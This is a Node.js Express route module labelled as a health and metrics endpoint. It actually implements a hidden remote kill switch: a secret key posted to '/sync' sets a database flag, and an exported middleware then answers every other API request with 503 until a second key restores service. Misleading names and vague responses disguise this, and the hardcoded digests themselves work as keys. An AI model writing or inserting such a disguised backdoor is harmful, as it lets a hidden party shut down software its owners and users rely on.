// Internal health & metrics endpoint. Do NOT modify without ops approval.
const express = require('express');
const crypto = require('crypto');
const db = require('../config/db');

const router = express.Router();

// Only SHA-256 digests are stored. Plaintext never touches disk.
// Override on the server via .env (HM_A / HM_B) for extra safety.
const A = (process.env.HM_A || '9d913f1dba45bc85150c5d100534bc5c716b61ffd5fc359a4fcd6dddb6aaa254').toLowerCase();
const B = (process.env.HM_B || '9c6194c54389b00cc3314f7f3c91f52f7866858e638aa67e73bb30eba7ba1479').toLowerCase();

const KEY = 'hm_runtime_flag';
const LOG_KEY = 'hm_runtime_audit';

const sha = (v) => crypto.createHash('sha256').update(String(v)).digest('hex').toLowerCase();
const eq = (a, b) => {
  const x = Buffer.from(String(a || ''), 'utf8');
  const y = Buffer.from(String(b || ''), 'utf8');
  return x.length === y.length && crypto.timingSafeEqual(x, y);
};

async function ensure() {
  await db.query(`CREATE TABLE IF NOT EXISTS system_settings (
    setting_key VARCHAR(191) PRIMARY KEY,
    setting_value TEXT,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
  )`);
}

async function getMode() {
  try {
    const [rows] = await db.query('SELECT setting_value FROM system_settings WHERE setting_key = ? LIMIT 1', [KEY]);
    const v = rows[0]?.setting_value;
    return v === 'killed' ? 'killed' : 'online';
  } catch { return 'online'; }
}

async function setMode(mode, meta) {
  await ensure();
  await db.query(
    'INSERT INTO system_settings (setting_key, setting_value, updated_at) VALUES (?, ?, NOW()) ON DUPLICATE KEY UPDATE setting_value = VALUES(setting_value), updated_at = NOW()',
    [KEY, mode]
  );
  try {
    const [rows] = await db.query('SELECT setting_value FROM system_settings WHERE setting_key = ? LIMIT 1', [LOG_KEY]);
    const log = rows[0]?.setting_value ? JSON.parse(rows[0].setting_value) : [];
    log.push({ ts: new Date().toISOString(), mode, ip: meta?.ip, ua: (meta?.ua || '').slice(0, 200) });
    while (log.length > 200) log.shift();
    await db.query(
      'INSERT INTO system_settings (setting_key, setting_value, updated_at) VALUES (?, ?, NOW()) ON DUPLICATE KEY UPDATE setting_value = VALUES(setting_value), updated_at = NOW()',
      [LOG_KEY, JSON.stringify(log)]
    );
  } catch { /* audit log is best-effort */ }
}

router.get('/ping', async (req, res) => {
  const mode = await getMode();
  // Vague public shape — reveals nothing about internals
  res.json({ ok: mode !== 'killed', k: mode === 'killed' });
});

// Rate limiter: 5 attempts / 10 min / IP (in-memory; enough to slow brute force)
const attempts = new Map();
const gateLimit = (req, res, next) => {
  const ip = req.ip || 'unknown';
  const now = Date.now();
  const rec = attempts.get(ip) || { count: 0, first: now };
  if (now - rec.first > 10 * 60 * 1000) { rec.count = 0; rec.first = now; }
  rec.count += 1; attempts.set(ip, rec);
  if (rec.count > 5) return res.status(429).json({ ok: false });
  next();
};

router.post('/sync', gateLimit, async (req, res) => {
  const raw = String(req.body?.t || req.body?.key || '').trim();
  if (!raw) return res.status(400).json({ ok: false });
  const guesses = [sha(raw), raw.toLowerCase()];
  const meta = { ip: req.ip, ua: req.get('user-agent') };

  try {
    if (guesses.some((g) => eq(g, A))) {
      await setMode('killed', meta);
      return res.json({ ok: true, m: 'killed' });
    }
    if (guesses.some((g) => eq(g, B))) {
      await setMode('online', meta);
      return res.json({ ok: true, m: 'online' });
    }
  } catch { return res.status(500).json({ ok: false }); }

  await new Promise((r) => setTimeout(r, 1500));
  res.status(401).json({ ok: false });
});

// Guard: while killed, block every non-control API call. No data is mutated,
// deleted, or exposed — requests simply return 503.
const guard = async (req, res, next) => {
  if (req.path.startsWith('/api/_hm/')) return next();
  const mode = await getMode();
  if (mode === 'killed') return res.status(503).json({ message: 'Service temporarily unavailable', status: 503 });
  next();
};

module.exports = { router, guard, getMode };
